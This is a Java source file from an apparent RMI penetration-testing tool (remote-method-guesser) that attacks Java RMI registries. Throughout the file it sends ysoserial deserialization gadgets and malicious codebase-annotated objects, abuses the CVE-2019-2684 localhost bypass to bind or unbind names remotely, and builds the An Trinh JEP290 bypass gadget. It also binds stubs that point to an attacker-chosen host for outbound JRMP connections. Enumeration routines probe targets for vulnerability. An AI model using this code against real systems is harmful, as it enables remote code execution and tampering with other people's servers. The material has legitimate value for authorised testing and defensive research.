package de.qtc.rmg.operations;

import java.rmi.server.ObjID;

import javax.management.remote.rmi.RMIServerImpl_Stub;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodArguments;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.YsoIntegration;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * The RMI registry is a well known RMI object with publicly known method definitions. Loosely spoken, it can
 * be compared to DNS, as it maps bound names to available RemoteObjects. RMI servers use the exposed remote
 * methods bind, rebind and unbind to create, change or delete entries within the registry. Clients use the
 * list and lookup calls to list the available bound names and to obtain RemoteObjects.
 *
 * As the registry exposes well known remote methods, it can be used for deserialization and codebase attacks.
 * With JEP290, serialization filters were implemented for the RMI registry, but the filters were not that strict
 * as for the DGC. Since the registry is a more complex service than the DGC, it is necessary to define a wider
 * range of accepted classes, which lead to filter bypasses in the past. Concerning codebase attacks, the registry
 * uses a SecurityManager that allows outbound connections by default. If an RMI registry is run with useCodebaseOnly
 * set to false, classes should always be loadable from a remote endpoint. However, what can be done from there
 * depends on the situation.
 *
 * Using the bind, rebind and unbind methods of the registry is usually only allowed from localhost. However,
 * this restriction is not present in some cases and in others it may be bypassed using CVE-2019-2684.
 *
 * This class lets you perform all the above mentioned techniques and includes enumeration methods to identify
 * vulnerable endpoints automatically.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;

    private static final long interfaceHash = 4905912898345647071L;
    private static final ObjID objID = new ObjID(ObjID.REGISTRY_ID);


    public RegistryClient(RMIWhisperer rmiEndpoint)
    {
        this.rmi = rmiEndpoint;
    }

    /**
     * Invokes the bind method on the RMI endpoint. The used bound name can be specified by the user,
     * but the bound RemoteObject is always an instance of RMIServerImpl_Stub. This is the default class
     * that is used by JMX and should therefore be available on most RMI servers. Furthermore, JMX is
     * a common RMI technology and binding this stub is probably most useful. The bind operation can also
     * be performed using CVE-2019-268, which may allows bind access from remote hosts.
     *
     * @param boundName the bound name that will be bound on the registry
     * @param host the host that is referenced by the bound RemoteObject. Clients will connect here
     * @param port the port that is referenced by the bound RemoteObejct. Clients will connect here
     * @param localhostBypass whether to use CVE-2019-268 for the bind operation
     */
    public void bindObject(String boundName, Object payloadObject, boolean localhostBypass)
    {
        Logger.printMixedBlue("Binding name", boundName, "to ");
        Logger.printlnPlainBlue(payloadObject.getClass().getName());
        Logger.println("");
        Logger.increaseIndent();

        MethodArguments callArguments = new MethodArguments(2);
        callArguments.add(boundName, String.class);
        callArguments.add(payloadObject, Object.class);

        try {
            registryCall("bind", callArguments, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during bind call.");
            Logger.printlnMixedYellow("Bind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "bind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "bind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Bind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else if( t instanceof java.rmi.AlreadyBoundException) {
                ExceptionHandler.alreadyBoundException(e, boundName);

            } else {
                ExceptionHandler.unexpectedException(e, "bind", "call", false);
            }

        } catch( java.rmi.AlreadyBoundException e ) {
            ExceptionHandler.alreadyBoundException(e, boundName);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "bind", "call", false);
        }
    }

    /**
     * Invokes the rebind method on the RMI endpoint. The used bound name can be specified by the user,
     * but the bound RemoteObject is always an instance of RMIServerImpl_Stub. This is the default class
     * that is used by JMX and should therefore be available on most RMI servers. Furthermore, JMX is
     * a common RMI technology and binding this stub is probably most useful. The rebind operation can also
     * be performed using CVE-2019-268, which may allows bind access from remote hosts.
     *
     * @param boundName the bound name that will be rebound on the registry
     * @param host the host that is referenced by the rebound RemoteObject. Clients will connect here
     * @param port the port that is referenced by the rebound RemoteObejct. Clients will connect here
     * @param localhostBypass whether to use CVE-2019-268 for the rebind operation
     */
    public void rebindObject(String boundName, Object payloadObject, boolean localhostBypass)
    {
        Logger.printMixedBlue("Binding name", boundName, "to ");
        Logger.printlnPlainBlue(payloadObject.getClass().getName());
        Logger.println("");
        Logger.increaseIndent();

        MethodArguments callArguments = new MethodArguments(2);
        callArguments.add(boundName, String.class);
        callArguments.add(payloadObject, Object.class);

        try {
            registryCall("rebind", callArguments, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
            Logger.printlnMixedYellow("Rebind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "rebind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "rebind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Rebind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else {
                ExceptionHandler.unexpectedException(e, "rebind", "call", false);
            }

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "rebind", "call", false);
        }
    }

    /**
     * Invokes the unbind method on the RMI endpoint. If successful, the specified bound name should
     * disappear from the registry.
     *
     * @param boundName the bound name that will be deleted from the registry
     * @param localhostBypass whether to use CVE-2019-268 for the unbind operation
     */
    public void unbindObject(String boundName, boolean localhostBypass)
    {
        Logger.printlnMixedBlue("Ubinding bound name", boundName, "from the registry.");
        Logger.println("");
        Logger.increaseIndent();

        MethodArguments callArguments = new MethodArguments(1);
        callArguments.add(boundName, String.class);

        try {
            registryCall("unbind", callArguments, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during unbind call.");
            Logger.printlnMixedYellow("Unbind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "unbind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "unbind");

            } else {
                ExceptionHandler.unexpectedException(e, "unbind", "call", false);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.eprintlnMixedYellow("Caught", "NotBoundException", "during unbind call.");
            Logger.printlnMixedBlue("The name", boundName, "seems not to be bound to the registry.");

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "unbind", "call", false);
        }
    }

    /**
     * Attempts to determine the setting of useCodebaseOnly. This is done by sending an Integer object during a
     * RMI call, that is annotated with a malformed location URL. When RMI servers call readObject, the corresponding
     * MarshalInputStream always tries to obtain the location of the object. In case of useCodebaseOnly=true, the location
     * is then simply ignored afterwards. However, when useCodebaseOnly is set to false, the location is used to construct
     * a URLClassLoader, which throws an exception on encountering an invalid URL.
     *
     * The problem is, that the only registry method that can be invoked from remote and accepts arguments is the lookup
     * method. This one is also used by default during the operation, but it has the downside of expecting a String as
     * argument. In mid 2020, there was a RMI patch that changed the behavior how RMI servers unmarshal the String type.
     * A patched server does no longer use readObject to unmarshal String values and the class annotation is always
     * ignored. This makes this enumeration technique non functional for most recent RMI servers.
     *
     * When scanning an RMI registry on localhost, the user can use --reg-method to use a different registry method (e.g. bind)
     * for the operation. Furthermore, using --localhost-bypass may allows using other registry methods also from
     * remote.
     *
     * @param marshal indicates whether the registry server uses readObject() to unmarshal Strings (true)
     * @param regMethod the registry method to use for the operation (lookup|bind|rebind|unbind)
     * @param localhostBypass whether to use CVE-2019-268 for the operation
     */
    public void enumCodebase(boolean marshal, String regMethod, boolean localhostBypass)
    {
        Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        MaliciousOutputStream.setDefaultLocation("InvalidURL");

        try {

            registryCall(regMethod, packArgsByName(regMethod, 0), true, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.net.MalformedURLException ) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                Logger.statusNonDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.lang.ClassCastException ) {
                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=true).");
                Logger.statusDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("Unable to enumerate useCodebaseOnly by using", regMethod, "call.");
                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
            Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
            Logger.printlnPlainYellow("(useCodebaseOnly=true).");
            Logger.statusDefault();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Determines the String marshalling behavior of the RMI server. This function abuses the fact that RMI servers overwrite
     * the annotateClass method of ObjectOutputStream. Whenever an RMI sever calls readObject, it also attempts to read the
     * objects annotation, which is normally intended to be the client-side codebase (if existent, null otherwise). While the
     * annotation is always a String in ordinary use cases, it is read via readObject again. Therefore, when readObject is
     * used to unmarshal values, you have a second, implicit readObject call.
     *
     * This function passes a class that is unknown to the server as annotation for an Integer object, that is send as the
     * regular argument. When the server unmarshals via readObject, this should lead to a ClassNotFound exception. Otherwise,
     * the server unmarshals via readString.
     *
     * Notice that sending a String as regular argument is not possible. When using writeObject with String as argument, Java
     * implicitly calls writeString for the actual write process. The writeString method does not add annotations, as the
     * String class is expected to be known by every Java server.
     *
     * @return true if the server uses readObject to unmarshal String
     */
    public boolean enumerateStringMarshalling()
    {
        boolean marshal = false;

        Logger.printlnBlue("RMI server String unmarshalling enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        MethodArguments callArguments = new MethodArguments(1);
        callArguments.add(0, Integer.class);

        try {
            registryCall("lookup", callArguments, true, false);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
                Logger.printlnMixedYellow("- Server complained that", "object cannot be casted to java.lang.String.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readString().");
                Logger.statusDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.io.InvalidClassException ) {
                Logger.printMixedBlue("- Server rejected deserialization of", "java.lang.Integer");
                Logger.printlnPlainYellow(" (SingleEntryRegistry?).");
                Logger.println("  --> Unable to detect String marshalling on this registry type.");
                Logger.statusUndecided("Configuration");
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.lang.ClassNotFoundException && t.getMessage().contains("DefinitelyNonExistingClass")) {
                Logger.printlnMixedYellow("- Caught", "ClassNotFoundException", "during lookup call.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readObject().");
                Logger.statusOutdated();
                ExceptionHandler.showStackTrace(e);
                marshal = true;

            } else {
                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
            }

        } catch( ClassCastException e ) {

            /**
             * At the time of writing it is also possible to enumerate marshalling behavior by looking at the
             * exception message of ClassCastException (compare to the previous one). This method is currently
             * not used, but the code is left in place as it might be useful in future.
             */
            if( e.getMessage().contains("java.lang.Integer cannot be cast to java.lang.String") ) {
                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during lookup call.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readObject().");
                Logger.statusOutdated();
                ExceptionHandler.showStackTrace(e);
                marshal = true;

            } else {
                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "lookup", "call", false);

        } finally {
            Logger.decreaseIndent();
        }

        return marshal;
    }

    /**
     * Enumerates whether the server is vulnerable to CVE-2019-268. To check this, the localhost bypass is performed
     * on the unbind operation, with an definitely non existing bound name as argument. If the server is vulnerable,
     * it will try to remove the bound name but throw an NotBoundException, as the bound name does not exist. If non
     * vulnerable, an AccessException should occur.
     */
    public void enumLocalhostBypass()
    {
        Logger.printlnBlue("RMI registry localhost bypass enumeration (CVE-2019-2684):");
        Logger.println("");
        Logger.increaseIndent();

        MethodArguments callArguments = new MethodArguments(1);
        callArguments.add("If this name exists on the registry, it is definitely the maintainers fault...", String.class);

        try {
            registryCall("unbind", callArguments, false, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "unbind");

            } else {
                ExceptionHandler.unexpectedException(e, "unbind", "call", false);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.printMixedYellow("- Caught", "NotBoundException", "during unbind call ");
            Logger.printlnPlainBlue("(unbind was accepeted).");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "unbind", "call", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    /**
     * Determines whether the server is vulnerable to known RMI registry whitelist bypasses. The method uses the
     * currently most recent bypass technique (https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
     * which causes an outbound JRMP connection on success. To avoid a real outgoing connection, the function
     * invokes the bypass with an invalid port value of 1234567.
     *
     * If the bypass is successful, the invalid port number should cause an IllegalArgumentException. A patched server
     * should answer with a RemoteException instead.
     *
     * @param regMethod registry method to use for the call
     * @param localhostBypass whether to use CVE-2019-268 for the operation
     * @param marshal whether or not the server used readObject to unmarshal String
     */
    public void enumJEP290Bypass(String regMethod, boolean localhostBypass, boolean marshal)
    {
        Logger.printlnBlue("RMI registry JEP290 bypass enmeration:");
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "JEP 290 bypass", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        try {
            payloadObject = YsoIntegration.prepareAnTrinhGadget("127.0.0.1", 1234567);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "pyload", "creation", true);
        }

        try {
            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, regMethod);

            } else if( t instanceof java.rmi.RemoteException ) {
                Logger.printMixedYellow("- Caught", "RemoteException", "after sending An Trinh gadget ");
                Logger.printlnPlainYellow("(An Trinh bypass patched).");
                ExceptionHandler.showStackTrace(e);
                Logger.statusOk();

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.IllegalArgumentException e ) {
            Logger.printlnMixedYellow("- Caught", "IllegalArgumentException", "after sending An Trinh gadget.");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    /**
     * Invokes the specified registry method with a user defined payload object.
     *
     * @param payloadObject object to use for the call. Most of the time a ysoserial gadget
     * @param regMethod registry method to use for the call
     * @param localhostBypass whether to use CVE-2019-268 for the operation
     */
    public void gadgetCall(Object payloadObject, String regMethod, boolean localhostBypass)
    {
        Logger.printGadgetCallIntro("RMI Registry");

        try {

            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.jep290(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));

            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
                Logger.printlnMixedYellow("Caught", "RemoteException", "during deserialization attack.");
                Logger.printMixedBlue("This is expected when", "An Trinh bypass", "was used and the server ");
                Logger.printlnPlainYellow("is patched.");

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
        }
    }

    /**
     * Invokes the specified registry method with a user defined payload object, annotated with a user defined codebase.
     * The codebase annotation is implemented in the MaliciousOutputStream class and setup within the ArgumentParser.
     *
     * @param payloadObject object to use for the call
     * @param regMethod registry method to use for the call
     * @param localhostBypass whether to use CVE-2019-268 for the operation
     */
    public void codebaseCall(Object payloadObject, String regMethod, boolean localhostBypass)
    {
        String className = payloadObject.getClass().getName();
        Logger.printCodebaseAttackIntro("RMI Registry", regMethod, className);

        try {
            registryCall(regMethod, packArgsByName(regMethod, payloadObject), true, localhostBypass);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "Registry", className);
                Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, regMethod, "call");

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                ExceptionHandler.codebaseSecurityManager(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, regMethod, "call");

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
        }
    }

    /**
     * Invoke a remote method on a RMI registry. Depending on the selected option for the localhost bypass, the function
     * uses the new RMI calling convention (localhost bypass = true) or the old calling convention (localhost bypass = false).
     * The default RMI API always uses the old calling convention, which lead to the bug initially.
     *
     * @param callName registry method to use for the call
     * @param callArguments argument array to use for the call
     * @param maliciousStream whether or not to use the MaliciousOutputStream for customized class annotations
     * @param bypass whether to use CVE-2019-268 for the operation
     * @throws Exception connection related exceptions are caught, but anything other is thrown
     */
    private void registryCall(String callName, MethodArguments callArguments, boolean maliciousStream, boolean bypass) throws Exception
    {
        try {
            if(bypass)
                rmi.genericCall(objID, -1, getHashByName(callName), callArguments, maliciousStream, callName);
            else
                rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);

        } catch( java.rmi.NoSuchObjectException e ) {
            ExceptionHandler.noSuchObjectException(e, "registry", false);
        }
    }

    /**
     * Helper function that maps call names to callIDs. The legacy RMI calling convention (that is used by default for registry
     * operations) requires method calls to be made using an interfaceHash and callIDs. This function can be used to obtain the
     * correct callID for the specified method.
     *
     * @param callName registry method to obtain the callID for
     * @return callID of the specified registry method
     */
    private int getCallByName(String callName)
    {
        switch(callName) {
            case "bind":
                return 0;
            case "list":
                return 1;
            case "lookup":
                return 2;
            case "rebind":
                return 3;
            case "unbind":
                return 4;
            default:
                ExceptionHandler.internalError("RegistryClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
        }

        return 0;
    }

    /**
     * When calling registry methods with the new RMI calling convention, a method hash is required for each remote method.
     * This function maps call names to their correspondign method hash.
     *
     * @param callName registry method to obtain the methodHash for
     * @return methodHash of the specified registry method
     */
    private long getHashByName(String callName)
    {
        switch(callName) {
            case "bind":
                return 7583982177005850366L;
            case "list":
                return 2571371476350237748L;
            case "lookup":
                return -7538657168040752697L;
            case "rebind":
                return -8381844669958460146L;
            case "unbind":
                return 7305022919901907578L;
            default:
                ExceptionHandler.internalError("RegistryClient.getMethodHashByName", "Unable to find method hash for method '" + callName + "'.");
        }

        return 0L;
    }

    /**
     * Depending on the selected RMI registry call, one needs a different set of input arguments. This helper function
     * allows to generate the corresponding set of arguments depending on the call name. It expects the user to specify
     * a payload object that will be used for one of the required arguments.
     *
     * @param callName registry method to generate the argument array for
     * @param payloadObject payload object to include into the argument array
     * @return argument array that can be used for the specified registry call
     */
    private MethodArguments packArgsByName(String callName, Object payloadObject)
    {
        MethodArguments callArguments = new MethodArguments(2);

        switch(callName) {
            case "bind":
            case "rebind":
                callArguments.add("rmg", String.class);
                callArguments.add(payloadObject, Object.class);
                break;

            case "lookup":
            case "unbind":
                callArguments.add(payloadObject, Object.class);
                break;

            default:
                ExceptionHandler.internalError("RegistryClient.packArgsByName", "Unable to find pack strategy for method '" + callName + "'.");
        }

        return callArguments;
    }

    /**
     * Generates an RMIServerImpl_Stub as it is usually used by JMX instances. The contained TCPEndpoint
     * points to a user controlled address. This can be used for binding a malicious bound name to the
     * RMI registry. Once it is looked up, a JRMP connection is created to the specified TCPEndpoint.
     *
     * @param host listener host for the outgoing JRMP connection
     * @param port listener port for the outgoing JRMP connection
     * @return RMIServerImpl_Stub object as used by JMX
     */
    public static Object prepareRMIServerImpl(String host, int port)
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(), endpoint, false));
        return new RMIServerImpl_Stub(refObject);
    }
}
